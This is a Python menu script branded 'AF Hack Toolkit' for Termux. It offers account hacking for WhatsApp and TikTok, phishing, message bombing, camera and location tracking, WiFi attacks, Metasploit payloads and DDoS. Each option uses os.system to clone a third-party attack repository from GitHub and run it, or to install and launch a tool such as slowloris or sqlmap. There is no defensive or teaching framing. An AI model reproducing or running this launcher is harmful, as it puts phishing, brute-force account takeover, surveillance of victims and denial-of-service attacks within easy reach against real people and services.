import os
import time

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Banner
def banner():
    os.system("clear")
    print(f"""{RED}
    █████╗ ███████╗  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗  
    ██╔══██╗██╔════╝  ██║  ██║██╔══██╗████╗ ████║██╔══██╗ 
    ███████║███████╗  ███████║███████║██╔████╔██║███████║ 
    ██╔══██║╚════██║  ██╔══██║██╔══██║██║╚██╔╝██║██╔══██║ 
    ██║  ██║███████║  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║ 
    ╚═╝  ╚═╝╚══════╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝  
    {RESET}
    """)
    print(f"{CYAN}🔥 AF Hack Toolkit - V3.0 | Developer: Ali Hamza 🔥{RESET}\n")

# Main Menu
def menu():
    print(f"{GREEN}[1] WhatsApp Hack (Phishing & Brute Force){RESET}")
    print(f"{GREEN}[2] WhatsApp Ban/Unban Tool{RESET}")
    print(f"{GREEN}[3] TikTok Hack Tool{RESET}")
    print(f"{GREEN}[4] Camera Hack & Location Tracker{RESET}")
    print(f"{GREEN}[5] WiFi Hacking (Evil Twin, WPS Attack, Deauth){RESET}")
    print(f"{GREEN}[6] Metasploit Payload Generator{RESET}")
    print(f"{GREEN}[7] DDoS Attack Tools (Slowloris, HTTP Flood, LOIC){RESET}")
    print(f"{GREEN}[8] Website Hacking Tools (SQLmap, Admin Finder){RESET}")
    print(f"{GREEN}[9] Termux Anonymity (TOR, MAC Changer){RESET}")
    print(f"{GREEN}[10] Join Our WhatsApp Channel{RESET}")
    print(f"{RED}[0] Exit{RESET}\n")

# Execute Commands
def run_tool(choice):
    if choice == "1":
        os.system("git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh")
    elif choice == "2":
        os.system("git clone https://github.com/termuxprofessor/whatsapp-bomber && cd whatsapp-bomber && bash wbomb.sh")
    elif choice == "3":
        os.system("git clone https://github.com/thelinuxchoice/tiktok-brute && cd tiktok-brute && python3 tiktok.py")
    elif choice == "4":
        os.system("git clone https://github.com/thewhiteh4t/seeker && cd seeker && python3 seeker.py")
    elif choice == "5":
        os.system("git clone https://github.com/derv82/wifite2 && cd wifite2 && python3 wifite.py")
    elif choice == "6":
        os.system("pkg install metasploit -y && msfconsole")
    elif choice == "7":
        os.system("pkg install slowloris -y && slowloris")
    elif choice == "8":
        os.system("pkg install sqlmap -y && sqlmap")
    elif choice == "9":
        os.system("pkg install tor macchanger -y && tor")
    elif choice == "10":
        os.system("am start -a android.intent.action.VIEW -d 'https://whatsapp.com/channel/0029VaU5UfBBVJl2sqYwbJ1t'")
    elif choice == "0":
        print(f"{YELLOW}Exiting AF Hack Team...{RESET}")
        time.sleep(2)
        exit()
    else:
        print(f"{RED}Invalid Option! Try Again.{RESET}")

# Main Function
def main():
    while True:
        banner()
        menu()
        choice = input(f"{CYAN}Select an Option: {RESET}")
        run_tool(choice)
        input(f"\n{YELLOW}Press Enter to Continue...{RESET}")

# Run Program
if __name__ == "__main__":
    main()
